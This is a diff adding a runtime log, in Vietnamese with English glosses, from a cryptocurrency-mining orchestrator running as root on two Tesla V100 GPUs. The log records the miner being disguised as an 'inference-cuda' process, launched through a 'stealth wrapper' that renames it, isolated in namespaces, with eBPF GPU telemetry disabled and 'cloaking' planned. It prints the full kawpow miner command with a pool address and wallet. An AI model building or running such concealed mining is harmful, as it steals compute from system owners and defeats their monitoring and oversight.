@@ -1,0 +1,203 @@
+2025-08-31 14:27:52,792 - start_mining - INFO - unknown - ===== Bắt đầu hoạt động khai thác tiền điện tử (Simplified Sequential Architecture) =====
+2025-08-31 14:27:52,793 - start_mining - INFO - unknown - 🔧 Đang thiết lập môi trường (sequential direct)...
+2025-08-31 14:27:52,793 - start_mining - INFO - unknown - Bắt đầu thiết lập môi trường khai thác (Thread-Safe Mode).
+2025-08-31 14:27:52,793 - start_mining - INFO - unknown - 🔐 Khởi tạo **Environment** (môi trường – hệ thống hoạt động) đã được khởi tạo thành công **privileged manager** (trình quản lý đặc quyền – quản lý hoạt động cần quyền cao)...
+2025-08-31 14:27:52,793 - start_mining - INFO - unknown - 🔑 Running as root (đang chạy với quyền root – đặc quyền đầy đủ) - all privileged operations available (mọi thao tác đặc quyền khả dụng)
+2025-08-31 14:27:52,793 - start_mining - INFO - unknown - 🔒 Xác thực **security context** (bối cảnh bảo mật – thông tin quyền hạn và bảo mật)...
+2025-08-31 14:27:52,796 - start_mining - INFO - unknown - ✅ Bối cảnh bảo mật: User=root, Root=True
+2025-08-31 14:27:52,796 - start_mining - INFO - unknown - 🎮 Kiểm tra **GPU access** (truy cập GPU – quyền sử dụng card đồ họa)...
+2025-08-31 14:27:52,796 - start_mining - DEBUG - unknown - [ROOT] Running (đang chạy lệnh – quyền root): nvidia-smi -L
+2025-08-31 14:27:52,817 - start_mining - DEBUG - unknown - [ROOT] Success (thành công – lệnh hoàn tất): GPU 0: Tesla V100-PCIE-16GB (UUID: GPU-88ef9265-bd70-dc59-a961-3dd6e66ca82b)
+GPU 1: Tesla V100-PCIE-16GB (UUID: GPU-717de74f-98eb-f989-a777-7913e0d22010)...
+2025-08-31 14:27:52,818 - start_mining - DEBUG - unknown - [ROOT] Running (đang chạy lệnh – quyền root): nvidia-smi --query-gpu=driver_version --format=csv,noheader
+2025-08-31 14:27:52,839 - start_mining - DEBUG - unknown - [ROOT] Success (thành công – lệnh hoàn tất): 550.90.07
+550.90.07...
+2025-08-31 14:27:52,841 - start_mining - INFO - unknown - ✅ Truy cập GPU: Available=True, Count=2
+2025-08-31 14:27:52,841 - start_mining - INFO - unknown - ℹ️ **eBPF GPU telemetry** (giám sát GPU qua eBPF – theo dõi hiệu suất GPU) đã được DISABLE để tránh **memory conflicts** (xung đột bộ nhớ – lỗi tranh chấp RAM)
+2025-08-31 14:27:52,841 - start_mining - INFO - unknown - 🌍 Chạy **centralized environment setup** (thiết lập môi trường tập trung – cấu hình chung cho hệ thống)...
+2025-08-31 14:27:53,183 - start_mining - INFO - unknown - ✅ Thiết lập môi trường thành công.
+2025-08-31 14:27:53,183 - start_mining - INFO - unknown - ✅ Thiết lập môi trường hoàn tất
+2025-08-31 14:27:55,188 - start_mining - INFO - unknown - 🚀 PID Logger worker started (simplified)
+2025-08-31 14:27:55,188 - start_mining - INFO - unknown - 🔧 [PHASE 3] Starting Enhanced Resource Manager với readiness validation...
+2025-08-31 14:27:55,188 - start_mining - INFO - unknown - 🏥 [TIER-1] Starting ResourceManager with direct instance management...
+2025-08-31 14:27:55,189 - start_mining - INFO - unknown - ⏳ [OPTIMIZED] Waiting for ResourceManager with reduced timeout...
+2025-08-31 14:28:05,201 - start_mining - INFO - unknown - ℹ️ [OPTIMIZED] ResourceManager chưa sẵn sàng sau 10.0s (sẽ tiếp tục chờ readiness)
+2025-08-31 14:28:05,202 - start_mining - INFO - unknown - 🔄 [FALLBACK] Hệ thống tiếp tục với chế độ basic - GPU process vẫn chạy
+2025-08-31 14:28:05,202 - start_mining - INFO - unknown - 📝 [FALLBACK] Cloaking sẽ được kích hoạt khi ResourceManager sẵn sàng
+2025-08-31 14:28:05,202 - start_mining.health_monitor - INFO - unknown - 🏥 [TIER-3] Enhanced ResourceManager health monitoring started
+2025-08-31 14:28:05,202 - start_mining - INFO - unknown - ⏳ [TIER-1] Waiting for ResourceManager readiness instead of thread completion...
+2025-08-31 14:28:05,203 - start_mining - INFO - unknown - ✅ [TIER-1] ResourceManager is ready and accepting handoffs
+2025-08-31 14:28:05,204 - start_mining - INFO - unknown - 🎯 [TIER-1] DirectPIDRegistry can now forward PIDs to ResourceManager
+2025-08-31 14:28:05,205 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:05,206 - start_mining - INFO - unknown - ✅ [TIER-1] ResourceManager thread is running persistently as daemon
+2025-08-31 14:28:05,206 - start_mining - INFO - unknown - 🔄 [TIER-1] Health monitor will track ResourceManager thread status
+2025-08-31 14:28:05,228 - start_mining - INFO - unknown - 🔍 [PHASE 3] Final ResourceManager readiness verification...
+2025-08-31 14:28:05,230 - start_mining - INFO - unknown - ✅ [PHASE 3] ResourceManager CONFIRMED READY - safe to start GPU processes
+2025-08-31 14:28:05,230 - start_mining - INFO - unknown - 🎯 [PHASE 3] Race condition prevention: ResourceManager accepting handoffs
+2025-08-31 14:28:05,230 - start_mining - INFO - unknown - 🔧 [SOLUTION-3] Implementing Explicit ResourceManager Registration...
+2025-08-31 14:28:05,230 - start_mining - INFO - unknown - ✅ [SOLUTION-3] ResourceManager instance found for registration
+2025-08-31 14:28:05,230 - start_mining - INFO - unknown - 🎯 [SOLUTION-3] ResourceManager SUCCESSFULLY REGISTERED with DirectPIDRegistry
+2025-08-31 14:28:05,231 - start_mining - INFO - unknown - ✅ [SOLUTION-3] Cross-process PID handoff mechanism activated
+2025-08-31 14:28:05,231 - start_mining - INFO - unknown - 🔗 [SOLUTION-3] DirectPIDRegistry → ResourceManager flow configured
+2025-08-31 14:28:05,231 - start_mining - INFO - unknown - ✅ [PHASE 3] Enhanced Resource Manager startup phase completed
+2025-08-31 14:28:05,231 - start_mining - INFO - unknown - 🎮 [RACE-FIX] Starting MULTI-GPU Mining AFTER ResourceManager ready AND registered...
+2025-08-31 14:28:05,231 - start_mining - DEBUG - unknown - Returning cached GPU info (trả về thông tin GPU từ bộ đệm – cache)
+2025-08-31 14:28:05,232 - start_mining - INFO - unknown - 🔍 [DEBUG] **start_gpu_mining_process()** (hàm khởi động tiến trình khai thác GPU) được gọi - **GPU-only mode** (chế độ chỉ GPU – chỉ dùng card đồ họa)
+2025-08-31 14:28:05,232 - start_mining - INFO - unknown - 🔍 [DEBUG] **GPU Executable path** (đường dẫn thực thi GPU – vị trí file chạy card đồ họa): /usr/local/bin/inference-cuda
+2025-08-31 14:28:05,232 - start_mining - INFO - unknown - 🎮 **GPU Mining** - **Mandatory CUDA loader**: /usr/local/bin/libmlls-cuda.so (exists=True)
+2025-08-31 14:28:05,233 - start_mining - INFO - unknown - 🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **INTENSITY parameter** (tham số cường độ – thiết lập mức sử dụng) đã tắt (**unsupported by binary** – không được hỗ trợ bởi file thực thi)
+2025-08-31 14:28:05,233 - start_mining - INFO - unknown - 🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - CHÍNH XÁC: Sử dụng **CUDA backend** (nền tảng CUDA – công nghệ tính toán GPU) với **kawpow algorithm** (thuật toán kawpow – giải thuật khai thác) cho **inference-cuda** (chương trình khai thác)
+2025-08-31 14:28:05,233 - start_mining - INFO - unknown - Sử dụng **PrivilegedOperationManager** (trình quản lý thao tác đặc quyền – công cụ điều khiển quyền cao) cho **namespace isolation** (cô lập không gian tên – tách biệt môi trường)
+2025-08-31 14:28:05,233 - start_mining - INFO - unknown - Thử khởi chạy **GPU mining process** (quá trình khai thác GPU – tiến trình đào coin card đồ họa) (**Attempt** 1/3 – lần thử 1/3)...
+2025-08-31 14:28:05,234 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Command** (lệnh – câu lệnh thực thi): /usr/local/bin/inference-cuda -a kawpow -o 127.0.0.1:4444 -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx --tls --cuda --cuda-loader=/usr/local/bin/libmlls-cuda.so
+2025-08-31 14:28:05,234 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Stealth** (ẩn danh – chế độ ẩn): True, **NS** (namespace – không gian tên): True
+2025-08-31 14:28:05,234 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Environment** (môi trường – biến hệ thống): Default (**stealth wrapper** (trình bao bọc ẩn danh) sẽ tạo **clean_env** – môi trường sạch)
+2025-08-31 14:28:05,234 - start_mining - INFO - unknown - 🔒 [SELF-STEALTH] Using GPU stealth wrapper: /app/mining_environment/stealth/wrappers/stealth_inference_cuda.py
+2025-08-31 14:28:05,234 - start_mining - INFO - unknown - 🔍 [DEBUG] About to call subprocess.Popen with command: ['/usr/bin/python', '/app/mining_environment/stealth/wrappers/stealth_inference_cuda.py', '-a', 'kawpow', '-o', '127.0.0.1:4444', '-u', 'RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx', '--tls', '--cuda', '--cuda-loader=/usr/local/bin/libmlls-cuda.so']
+2025-08-31 14:28:05,236 - start_mining - INFO - unknown - 🔍 [DEBUG] subprocess.Popen completed successfully
+2025-08-31 14:28:05,236 - start_mining - INFO - unknown - ✅ [SELF-STEALTH] GPU stealth process started with PID: 141
+2025-08-31 14:28:05,236 - start_mining - INFO - unknown - 🔍 [SELF-STEALTH] GPU process will self-rename using internal stealth manager
+2025-08-31 14:28:05,237 - start_mining - INFO - unknown - 🔍 GPU process created successfully with PID: 141
+2025-08-31 14:28:05,237 - start_mining - INFO - unknown - 🚀 MINING PROCESS STARTED [GPU]
+   ├─ Process Name: inference-cuda[gpu0]
+   ├─ PID: 141
+   ├─ Command: /usr/local/bin/inference-cuda -a kawpow -o 127.0.0.1:4444 -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx --tls --cuda --cuda-loader=/usr/local/bin/libmlls-cuda.so
+   ├─ Log File: /app/mining_environment/logs/gpu0_miner.log
+   ├─ Stealth Mode: True
+   └─ Namespace Isolation: True
+2025-08-31 14:28:09,241 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Starting PID Relationship Detection for wrapper PID 141
+2025-08-31 14:28:09,242 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Found 1 child process(es) of wrapper PID 141
+2025-08-31 14:28:09,243 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Analyzing child: PID=142, name='inference-cuda', ppid=141
+2025-08-31 14:28:09,243 - start_mining - INFO - unknown - ✅ [PID-DETECTION] Match by executable: /usr/local/bin/inference-cuda.original
+2025-08-31 14:28:09,244 - start_mining - INFO - unknown - 🎯 [PID-DETECTION] Real mining PID detected: 142
+2025-08-31 14:28:09,244 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Detection method: executable
+2025-08-31 14:28:09,244 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Process details: name='inference-cuda' (may be spoofed by stealth)
+2025-08-31 14:28:09,244 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Process age: 4.3 seconds
+2025-08-31 14:28:09,295 - start_mining - INFO - unknown - ✅ Enhanced PID Logger registered real mining PID 142 (gpu)
+2025-08-31 14:28:09,295 - start_mining - INFO - unknown - 🎯 [ENHANCED] Real mining PID 142 stored in process object
+2025-08-31 14:28:09,295 - start_mining - INFO - unknown - PROCESS_START: inference-cuda[gpu0] | PID=141 | TYPE=GPU | TIME=1756650485.237007
+2025-08-31 14:28:09,296 - start_mining - INFO - unknown - ✅ Mining process started successfully:
+2025-08-31 14:28:09,296 - start_mining - INFO - unknown -    ├─ Type: GPU
+2025-08-31 14:28:09,296 - start_mining - INFO - unknown -    ├─ PID: 142
+2025-08-31 14:28:09,296 - start_mining - INFO - unknown -    ├─ Name: inference-cuda[gpu0]
+2025-08-31 14:28:09,296 - start_mining - INFO - unknown -    └─ Registration: Handled by DirectPIDRegistry in stealth wrapper
+2025-08-31 14:28:09,298 - start_mining - INFO - unknown - 🚀 [Mining Log] Dual logging thread started for inference-cuda[gpu0]
+2025-08-31 14:28:10,211 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:11,301 - start_mining - INFO - unknown - 🔍 [DEBUG] About to return process object - PID: 141, Type: <class 'subprocess.Popen'>
+2025-08-31 14:28:11,301 - start_mining - INFO - unknown - ✅ Multi-GPU: started miner for GPU 0 (PID=141, real=142)
+2025-08-31 14:28:11,301 - start_mining - INFO - unknown - 🔍 [DEBUG] **start_gpu_mining_process()** (hàm khởi động tiến trình khai thác GPU) được gọi - **GPU-only mode** (chế độ chỉ GPU – chỉ dùng card đồ họa)
+2025-08-31 14:28:11,302 - start_mining - INFO - unknown - 🔍 [DEBUG] **GPU Executable path** (đường dẫn thực thi GPU – vị trí file chạy card đồ họa): /usr/local/bin/inference-cuda
+2025-08-31 14:28:11,302 - start_mining - INFO - unknown - 🎮 **GPU Mining** - **Mandatory CUDA loader**: /usr/local/bin/libmlls-cuda.so (exists=True)
+2025-08-31 14:28:11,302 - start_mining - INFO - unknown - 🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **INTENSITY parameter** (tham số cường độ – thiết lập mức sử dụng) đã tắt (**unsupported by binary** – không được hỗ trợ bởi file thực thi)
+2025-08-31 14:28:11,303 - start_mining - INFO - unknown - 🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - CHÍNH XÁC: Sử dụng **CUDA backend** (nền tảng CUDA – công nghệ tính toán GPU) với **kawpow algorithm** (thuật toán kawpow – giải thuật khai thác) cho **inference-cuda** (chương trình khai thác)
+2025-08-31 14:28:11,303 - start_mining - INFO - unknown - Sử dụng **PrivilegedOperationManager** (trình quản lý thao tác đặc quyền – công cụ điều khiển quyền cao) cho **namespace isolation** (cô lập không gian tên – tách biệt môi trường)
+2025-08-31 14:28:11,303 - start_mining - INFO - unknown - Thử khởi chạy **GPU mining process** (quá trình khai thác GPU – tiến trình đào coin card đồ họa) (**Attempt** 1/3 – lần thử 1/3)...
+2025-08-31 14:28:11,304 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Command** (lệnh – câu lệnh thực thi): /usr/local/bin/inference-cuda -a kawpow -o 127.0.0.1:4444 -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx --tls --cuda --cuda-loader=/usr/local/bin/libmlls-cuda.so
+2025-08-31 14:28:11,304 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Stealth** (ẩn danh – chế độ ẩn): True, **NS** (namespace – không gian tên): True
+2025-08-31 14:28:11,304 - start_mining - INFO - unknown - 🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Environment** (môi trường – biến hệ thống): Default (**stealth wrapper** (trình bao bọc ẩn danh) sẽ tạo **clean_env** – môi trường sạch)
+2025-08-31 14:28:11,304 - start_mining - INFO - unknown - 🔒 [SELF-STEALTH] Using GPU stealth wrapper: /app/mining_environment/stealth/wrappers/stealth_inference_cuda.py
+2025-08-31 14:28:11,304 - start_mining - INFO - unknown - 🔍 [DEBUG] About to call subprocess.Popen with command: ['/usr/bin/python', '/app/mining_environment/stealth/wrappers/stealth_inference_cuda.py', '-a', 'kawpow', '-o', '127.0.0.1:4444', '-u', 'RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx', '--tls', '--cuda', '--cuda-loader=/usr/local/bin/libmlls-cuda.so']
+2025-08-31 14:28:11,306 - start_mining - INFO - unknown - 🔍 [DEBUG] subprocess.Popen completed successfully
+2025-08-31 14:28:11,306 - start_mining - INFO - unknown - ✅ [SELF-STEALTH] GPU stealth process started with PID: 207
+2025-08-31 14:28:11,306 - start_mining - INFO - unknown - 🔍 [SELF-STEALTH] GPU process will self-rename using internal stealth manager
+2025-08-31 14:28:11,306 - start_mining - INFO - unknown - 🔍 GPU process created successfully with PID: 207
+2025-08-31 14:28:11,307 - start_mining - INFO - unknown - 🚀 MINING PROCESS STARTED [GPU]
+   ├─ Process Name: inference-cuda[gpu1]
+   ├─ PID: 207
+   ├─ Command: /usr/local/bin/inference-cuda -a kawpow -o 127.0.0.1:4444 -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx --tls --cuda --cuda-loader=/usr/local/bin/libmlls-cuda.so
+   ├─ Log File: /app/mining_environment/logs/gpu1_miner.log
+   ├─ Stealth Mode: True
+   └─ Namespace Isolation: True
+2025-08-31 14:28:15,217 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:15,311 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Starting PID Relationship Detection for wrapper PID 207
+2025-08-31 14:28:15,312 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Found 1 child process(es) of wrapper PID 207
+2025-08-31 14:28:15,313 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Analyzing child: PID=209, name='inference-cuda', ppid=207
+2025-08-31 14:28:15,313 - start_mining - INFO - unknown - ✅ [PID-DETECTION] Match by executable: /usr/local/bin/inference-cuda.original
+2025-08-31 14:28:15,313 - start_mining - INFO - unknown - 🎯 [PID-DETECTION] Real mining PID detected: 209
+2025-08-31 14:28:15,313 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Detection method: executable
+2025-08-31 14:28:15,314 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Process details: name='inference-cuda' (may be spoofed by stealth)
+2025-08-31 14:28:15,314 - start_mining - INFO - unknown - 🔍 [PID-DETECTION] Process age: 4.3 seconds
+2025-08-31 14:28:15,316 - start_mining - INFO - unknown - ✅ Enhanced PID Logger registered real mining PID 209 (gpu)
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown - 🎯 [ENHANCED] Real mining PID 209 stored in process object
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown - PROCESS_START: inference-cuda[gpu1] | PID=207 | TYPE=GPU | TIME=1756650491.3069842
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown - ✅ Mining process started successfully:
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown -    ├─ Type: GPU
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown -    ├─ PID: 209
+2025-08-31 14:28:15,317 - start_mining - INFO - unknown -    ├─ Name: inference-cuda[gpu1]
+2025-08-31 14:28:15,318 - start_mining - INFO - unknown -    └─ Registration: Handled by DirectPIDRegistry in stealth wrapper
+2025-08-31 14:28:15,319 - start_mining - INFO - unknown - 🚀 [Mining Log] Dual logging thread started for inference-cuda[gpu1]
+2025-08-31 14:28:17,322 - start_mining - INFO - unknown - 🔍 [DEBUG] About to return process object - PID: 207, Type: <class 'subprocess.Popen'>
+2025-08-31 14:28:17,327 - start_mining - INFO - unknown - ✅ Multi-GPU: started miner for GPU 1 (PID=207, real=209)
+2025-08-31 14:28:17,328 - start_mining - INFO - unknown - ✅ [RACE-FIX] MULTI-GPU miners started: [0, 1]
+2025-08-31 14:28:17,330 - start_mining - INFO - unknown - 🎯 [ENHANCED] Multi-GPU manager active; managed_gpus=[0, 1]
+2025-08-31 14:28:17,333 - start_mining - INFO - unknown - 📋 Simple registry monitoring started
+2025-08-31 14:28:17,333 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:28:17,333 - start_mining - INFO - unknown - ✅ Simple Registry Monitor started
+2025-08-31 14:28:17,335 - start_mining - INFO - unknown - 🚀 SIMPLIFIED SEQUENTIAL ARCHITECTURE STARTUP COMPLETED
+2025-08-31 14:28:17,336 - start_mining - INFO - unknown - 🎯 Background threads: 2/2
+2025-08-31 14:28:17,340 - start_mining - INFO - unknown - 🎮 GPU Processes: 2/2 running
+2025-08-31 14:28:17,341 - start_mining - INFO - unknown - 🔍 Starting simplified monitoring loop...
+2025-08-31 14:28:17,342 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:28:20,222 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:25,228 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:30,234 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:35,239 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:40,244 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:45,248 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:47,342 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:28:47,365 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:28:50,253 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:28:50,253 - start_mining.health_monitor - INFO - unknown - 📊 [HEALTH-REPORT] Uptime: 0.0h, Health: 100.0%, Checks: 10, Restarts: 0/0
+2025-08-31 14:28:55,258 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:00,264 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:05,269 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:10,275 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:15,280 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:17,365 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:29:17,367 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:29:20,286 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:25,291 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:30,296 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:35,301 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:40,306 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:40,307 - start_mining.health_monitor - INFO - unknown - 📊 [HEALTH-REPORT] Uptime: 0.0h, Health: 100.0%, Checks: 20, Restarts: 0/0
+2025-08-31 14:29:45,312 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:47,388 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:29:47,398 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:29:50,317 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:29:55,323 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:00,328 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:05,334 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:10,339 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:15,344 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:17,397 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:30:17,403 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:30:20,349 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:25,354 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:30,360 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:30,360 - start_mining.health_monitor - INFO - unknown - 📊 [HEALTH-REPORT] Uptime: 0.0h, Health: 100.0%, Checks: 30, Restarts: 0/0
+2025-08-31 14:30:35,366 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:40,371 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:45,377 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:47,415 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:30:47,434 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:30:50,383 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:30:55,389 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:00,395 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:05,400 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:10,405 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:15,411 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:17,442 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:31:17,445 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:31:20,417 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:20,417 - start_mining.health_monitor - INFO - unknown - 📊 [HEALTH-REPORT] Uptime: 0.1h, Health: 100.0%, Checks: 40, Restarts: 0/0
+2025-08-31 14:31:25,423 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:30,428 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:35,434 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:40,440 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:45,445 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:47,454 - start_mining - INFO - unknown - ✅ System healthy - GPUs alive: [0, 1]
+2025-08-31 14:31:47,473 - start_mining - DEBUG - unknown - 📊 Registry: 2 processes
+2025-08-31 14:31:50,451 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:31:55,458 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
+2025-08-31 14:32:00,463 - start_mining.health_monitor - DEBUG - unknown - ✅ [TIER-3] ResourceManager fully healthy - thread: True, instance: True, ready: True, shared_manager: True
